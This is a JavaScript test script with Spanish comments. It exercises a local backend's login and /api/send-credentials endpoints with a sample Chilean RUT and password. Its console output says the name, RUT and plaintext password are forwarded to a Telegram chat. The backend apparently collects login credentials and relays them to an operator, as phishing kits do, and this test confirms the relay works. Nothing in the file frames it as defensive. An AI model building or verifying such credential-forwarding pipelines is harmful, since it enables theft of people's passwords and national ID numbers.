// Test para verificar el endpoint /api/send-credentials

const TEST_RUT = '24.012.345-K';
const TEST_PASSWORD = 'test123';
const TEST_NAME = 'Juan Pérez';
const BACKEND_URL = 'http://localhost:3000';

async function testCredentialsEndpoint() {
  console.log('🧪 Testing /api/send-credentials endpoint...\n');
  
  try {
    // Hacer login primero
    console.log('1️⃣ Making login request...');
    const loginRes = await fetch(`${BACKEND_URL}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        rut: TEST_RUT, 
        password: TEST_PASSWORD 
      })
    });
    
    const loginData = await loginRes.json();
    console.log('✅ Login response:', JSON.stringify(loginData, null, 2));
    
    if (!loginData.success) {
      console.error('❌ Login failed!');
      return;
    }
    
    const messageId = loginData.messageId;
    console.log(`\n2️⃣ Sending credentials to Telegram (messageId: ${messageId})...`);
    
    // Ahora enviar credenciales
    const credsRes = await fetch(`${BACKEND_URL}/api/send-credentials`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        messageId,
        rut: TEST_RUT,
        password: TEST_PASSWORD,
        name: loginData.name
      })
    });
    
    const credsData = await credsRes.json();
    console.log('✅ Credentials endpoint response:', JSON.stringify(credsData, null, 2));
    
    console.log('\n✅ Test completed successfully!');
    console.log('\n📱 Check your Telegram chat to verify that:');
    console.log('   1. Login message was sent with name and RUT');
    console.log('   2. Credentials message (with password) was sent');
    
  } catch (error) {
    console.error('❌ Test error:', error.message);
  }
}

// Run test
testCredentialsEndpoint();
